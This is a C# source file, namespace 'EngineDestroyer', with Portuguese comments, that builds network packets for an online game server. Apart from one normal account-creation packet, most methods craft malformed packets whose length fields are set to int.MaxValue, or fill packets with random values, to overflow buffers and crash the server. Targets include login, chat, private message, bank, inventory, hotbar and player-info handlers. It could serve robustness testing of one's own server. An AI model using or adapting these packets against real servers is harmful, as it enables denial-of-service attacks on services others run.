using System;
using System.Text;

namespace EngineDestroyer {
    public sealed class Packet {
        private const int PacketSizeInBytes = 4;
        private const int HeaderSizeInBytes = 4;
        private const int DataSizeInBytes = 4;

        /// <summary>
        ///  Cria o pacote para criação de usuário.
        /// </summary>
        /// <param name="account"></param>
        /// <param name="password"></param>
        /// <returns></returns>
        public static byte[] CreateAccount(string account, string password = "") {
            // Como é feito o cálculo do tamanho total do pacote.
            // PacketSize = Header + UserLenght + ArrayBytes(User) + PassLenght + ArrayBytes(Password).
            // O header é sempre um inteiro de 4 bytes.

            // Índice do pacote.
            var head = 0;
 
            // Tamanho total de bytes.
            var arraySize = 0;

            const int AccountSizeInBytes = 4;
            const int PasswordSizeInBytes = 4;

            // Realiza o cálculo da quantidade de bytes disponíveis no array para a criação do pacote.
            arraySize = PacketSizeInBytes;
            arraySize += HeaderSizeInBytes;
            // Quantidade de caracteres em inteiro de 4 bytes.
            arraySize += AccountSizeInBytes;
            // Reserva 1 byte para cada caractere.
            arraySize += account.Length;
            // Quantidade de caracteres em inteiro de 4 bytes.
            arraySize += PasswordSizeInBytes;
            // Reserva 1 byte para cada caractere.
            arraySize += password.Length;

            // Inicializa o pacote com a quantidade de espaços definida.
            var packet = new byte[arraySize];

            // Os 4 primeiros bytes (de 0 até 3 ), é o tamanho do pacote, portanto, é adicionado no final.

            // O header começa no array (do 4 até o 7). 
            // O header para criar uma nova conta é 1, nesse caso, não há necessidade de fazer uma conversão.
            // Ele é adicionado logo no início.
            head = 4;
            packet[head] = (byte)ClientPacket.CNewAccount;

            // O tamanho do usuário começa no array ( do 8 até 11).
            // Adiciona mais 4 para avançar a posição no array.
            head += 4;

            // Como os números tem valores pequenos, não é necessário fazer a conversão.
            packet[head] = (byte)account.Length;

            // Converte a conta do usuário em um array de bytes.
            var user = Encoding.ASCII.GetBytes(account);

            // Avança a posição do array para o índice 12.
            head += 4;     

            // 12 em diante é o nome do usuário convertido pra bytes.
            // Copia os bytes para o pacote.
            Array.Copy(user, 0, packet, head, user.Length);

            // Adiciona a quantidade de bytes que foi adicionada no pacote.
            head += user.Length; 

            // Adiciona o tamanho da senha de usuário.
            packet[head] = (byte)password.Length;
            
            // Aumenta para ir para o próximo índice.
            head += 4; 
            
            // Converte a senha do usuário em um array de bytes.
            var pass = Encoding.ASCII.GetBytes(password);
            Array.Copy(pass, 0, packet, head, pass.Length);
      
            // Finalmente, escreve o tamanho do pacote no início do pacote.
            // packet.Lenght - 4 (Remove os 4 primeiros bytes que indicam apenas o tamanho do pacote).
            var buffer = BitConverter.GetBytes(packet.Length - 4);
            Array.Copy(buffer, 0, packet, 0, buffer.Length);
             
            // Quando o pacote chega no servidor, ele é analisado e então, antes de ser chamado para o handledata.
            // É removido os 4 primeiros bytes que indica o tamanho total do pacote
          
            return packet;
        }

        /// <summary>
        /// Gera um estouro quando tenta ler uma string.
        /// </summary>
        /// <param name="account"></param>
        /// <param name="version"></param>
        /// <returns></returns>
        public static byte[] LoginOverflow(string account, bool version = false) {        
            var totalSize = PacketSizeInBytes + HeaderSizeInBytes + (account.Length * 3) + 8;
            var packet = new byte[totalSize];
            var head = 4;

            packet[head] = (byte)ClientPacket.CLogin;

            // Escreve um valor muito grande para dar erro no servidor.
            var buffer = BitConverter.GetBytes(int.MaxValue);
            Array.Copy(buffer, 0, packet, 8, buffer.Length);

            var user = Encoding.ASCII.GetBytes(account);
            Array.Copy(user, 0, packet, 12, user.Length);

            head = 12 + user.Length;  

            // Tamanho da senha de usuário.
            buffer = BitConverter.GetBytes(int.MaxValue);
            Array.Copy(buffer, 0, packet, 8, buffer.Length);

            packet[head] = (byte)account.Length;

            head += 4;
       
            // Escreve a senha.
            Array.Copy(user, 0, packet, head, user.Length);

            // Define o tamanho do pacote.
            buffer = BitConverter.GetBytes(packet.Length - 4);
            Array.Copy(buffer, 0, packet, 0, buffer.Length);

            return packet;
        }

        /// <summary>
        /// Envia uma mensagem para o servidor.
        /// </summary>
        /// <param name="cPacket"></param>
        /// <param name="text"></param>
        /// <param name="overflow"></param>
        /// <returns></returns>
        public static byte[] Message(ClientPacket cPacket, string text, bool overflow = false) {
            var packet = new byte[text.Length + 12];
            var head = 4;
            var buffer = new byte[sizeof(int)];

            packet[head] = (byte)cPacket;

            head += 4;

            if (overflow) {
                // Cria um estouro.
                buffer = BitConverter.GetBytes(int.MaxValue);
            }
            else {
                // Escreve a quantidade de caracteres.
                buffer = BitConverter.GetBytes(text.Length);
            }

            Array.Copy(buffer, 0, packet, head, buffer.Length);

            head += 4;

            // Escreve a mensagem.
            var msg = Encoding.ASCII.GetBytes(text);
            Array.Copy(msg, 0, packet, head, msg.Length);

            head += msg.Length;

            // Escreve o tamanho do pacote.
            buffer = BitConverter.GetBytes(packet.Length - 4);
            Array.Copy(buffer, 0, packet, 0, buffer.Length);

            return packet;
        }
   
        /// <summary>
        /// Envia uma mensagem privada para o alvo.
        /// </summary>
        /// <param name="text"></param>
        /// <param name="target"></param>
        /// <param name="overflow"></param>
        /// <returns></returns>
        public static byte[] PlayerMessage(string text, string target, bool overflow = false) {
            var packet = new byte[text.Length + target.Length + 16];
            var head = 4;
            var buffer = new byte[sizeof(int)];

            packet[head] = (byte)ClientPacket.CPlayerMsg;

            head += 4;

            // Escreve o tamanho do nome do alvo.
            buffer = BitConverter.GetBytes(target.Length);
            Array.Copy(buffer, 0, packet, head, buffer.Length);

            head += 4;

            // Escreve o nome do alvo
            var player = Encoding.ASCII.GetBytes(target);
            Array.Copy(player, 0, packet, head, player.Length);

            head += player.Length;

            if (overflow) {
                // Cria um estouro.
                buffer = BitConverter.GetBytes(int.MaxValue);
            }
            else {
                // Escreve a quantidade de caracteres da mensagem.
                buffer = BitConverter.GetBytes(text.Length);
            }

            Array.Copy(buffer, 0, packet, head, buffer.Length);

            head += 4;

            // Escreve a mensagem.
            var msg = Encoding.ASCII.GetBytes(text);
            Array.Copy(msg, 0, packet, head, msg.Length);

            head += msg.Length;

            // Escreve o tamanho do pacote.
            buffer = BitConverter.GetBytes(packet.Length - 4);
            Array.Copy(buffer, 0, packet, 0, buffer.Length);

            return packet;
        }

        /// <summary>
        /// Cria o pacote para a troca de banco com números de 8 bytes.
        /// </summary>
        /// <returns></returns>
        public static byte[] ChangeBankSlots() {
            var packet = new byte[PacketSizeInBytes + HeaderSizeInBytes + DataSizeInBytes + DataSizeInBytes];

            packet[4] = (byte)ClientPacket.CChangeBankSlots;

            // Primeiro número.
            var buffer = BitConverter.GetBytes(int.MaxValue);
            Array.Copy(buffer, 0, packet, 8, buffer.Length);

            // Segundo número.
            buffer = BitConverter.GetBytes(int.MaxValue);
            Array.Copy(buffer, 0, packet, 12, buffer.Length);

            // Escreve o tamanho do pacote.
            packet[0] = HeaderSizeInBytes + DataSizeInBytes + DataSizeInBytes;

            return packet;
        }

        /// <summary>
        /// Cria o pacote para a troca de inventário com números de 8 bytes.
        /// </summary>
        /// <returns></returns>
        public static byte[] SwapInvSlots() {
            var packet = new byte[PacketSizeInBytes + HeaderSizeInBytes + DataSizeInBytes + DataSizeInBytes];

            packet[4] = (byte)ClientPacket.CSwapInvSlots;

            // Primeiro número.
            var buffer = BitConverter.GetBytes(int.MaxValue);
            Array.Copy(buffer, 0, packet, 8, buffer.Length);

            // Segundo número
            buffer = BitConverter.GetBytes(int.MaxValue);
            Array.Copy(buffer, 0, packet, 12, buffer.Length);

            // Escreve o tamanho do pacote.
            packet[0] = HeaderSizeInBytes + DataSizeInBytes + DataSizeInBytes;

            return packet;
        }

        /// <summary>
        /// Cria o pacote para uso da hotbar com números de 8 bytes.
        /// </summary>
        /// <returns></returns>
        public static byte[] HotbarUse() {
            var packet = new byte[PacketSizeInBytes + HeaderSizeInBytes + DataSizeInBytes];
            packet[4] = (byte)ClientPacket.CHotbarUse;

            var buffer = BitConverter.GetBytes(int.MaxValue);
            Array.Copy(buffer, 0, packet, 8, buffer.Length);

            packet[0] = (byte)(packet.Length - 4);

            return packet;
        }

        /// <summary>
        /// Envia um número maior do que o permitido.
        /// </summary>
        /// <returns></returns>
        public static byte[] HotbarChange() {
            var packet = new byte[5 * 4];
            var head = 4;

            packet[head] = (byte) ClientPacket.CHotbarChange;

            // Type = 0, não é necessário escrever. 
            // Head += 4;

            head += 8;
           
            // Valor do slot.
            var buffer = BitConverter.GetBytes(int.MaxValue);
            Array.Copy(buffer, 0, packet, head, buffer.Length);

            // Hotbar.
            head += 4;
             
            buffer = BitConverter.GetBytes(int.MaxValue);
            Array.Copy(buffer, 0, packet, head, buffer.Length);

            packet[0] = (byte)(packet.Length - 4);

            return packet;
       }

        /// <summary>
        /// Requisita as informaçãoes do alvo (jogador).
        /// </summary>
        /// <param name="overflow"></param>
        /// <returns></returns>
        public static byte[] PlayerInfoRequest(bool overflow = false) {
            var text = "mensagem";
            var packet = new byte[PacketSizeInBytes + HeaderSizeInBytes + text.Length + DataSizeInBytes]; 
            var buffer = new byte[sizeof(int)];
            var head = 4;

            packet[head] = (byte)ClientPacket.CPlayerInfoRequest;

            head += 4;

            if (overflow) {
                // Cria um estouro no buffer.
                buffer = BitConverter.GetBytes(int.MaxValue);
            }
            else {
                // Escreve a quantidade de caracteres.
                buffer = BitConverter.GetBytes(text.Length);
            }

            Array.Copy(buffer, 0, packet, head, buffer.Length);

            head += 4;

            // Escreve a mensagem.
            var msg = Encoding.ASCII.GetBytes(text);
            Array.Copy(msg, 0, packet, head, msg.Length);

            head += msg.Length;

            // Escreve o tamanho do pacote.
            buffer = BitConverter.GetBytes(packet.Length - 4);
            Array.Copy(buffer, 0, packet, 0, buffer.Length);

            return packet;
        }

        /// <summary>
        /// Cria o pacote com vários valores aleatório para atacar determinado cabeçalho.
        /// </summary>
        /// <param name="header"></param>
        /// <param name="count">Quantidade de valores de 4 bytes presente no pacote.</param>
        /// <returns></returns>
        public static byte[] CreateRagePacket(int header, int count) {
            var packet = new byte[PacketSizeInBytes + HeaderSizeInBytes + (sizeof(int) * count)];
            var head = 4;

            // Escreve o header.
            var buffer = BitConverter.GetBytes(header);
            Array.Copy(buffer, 0, packet, head, buffer.Length);

            head += 4;

            for(int n = 0; n < count; n++) {
                buffer = BitConverter.GetBytes(new Random().Next(50000, int.MaxValue));
                Array.Copy(buffer, 0, packet, head, buffer.Length);
                head += 4;
            }

            // Escreve o tamanho do pacote.
            buffer = BitConverter.GetBytes(packet.Length - 4);
            Array.Copy(buffer, 0, packet, 0, buffer.Length);

            return packet;
        }
    }
}